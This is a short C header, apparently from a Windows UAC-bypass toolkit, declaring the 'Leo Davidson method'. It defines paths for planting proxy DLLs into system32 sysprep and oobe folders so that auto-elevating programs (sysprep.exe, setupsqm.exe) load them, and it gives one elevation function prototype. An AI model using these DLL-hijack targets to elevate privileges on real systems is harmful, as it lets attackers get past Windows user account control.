/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2015
*
*  TITLE:       PITOU.H
*
*  VERSION:     1.70
*
*  DATE:        24 Apr 2015
*
*  Prototypes and definitions for Leo Davidson method.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

//
// Standard elevation methods.
//
#define M1W7_SOURCEDLL			L"%temp%\\CRYPTBASE.dll"
#define M1W7_TARGETDIR			L"%systemroot%\\system32\\sysprep\\"
#define M1W7_TARGETPROCESS		L"%systemroot%\\system32\\sysprep\\sysprep.exe"
#define M1W8_SOURCEDLL			L"%temp%\\shcore.dll"
#define M1WALL_SOURCEDLL		L"%temp%\\wdscore.dll"
#define M1W7T_SOURCEDLL			L"%temp%\\ActionQueue.dll"
#define M1WALL_TARGETDIR		L"%systemroot%\\system32\\oobe\\"
#define M1WALL_TARGETPROCESS	L"%systemroot%\\system32\\oobe\\setupsqm.exe"

BOOL ucmStandardAutoElevation(
	DWORD dwType,
	CONST PVOID ProxyDll,
	DWORD ProxyDllSize
	);
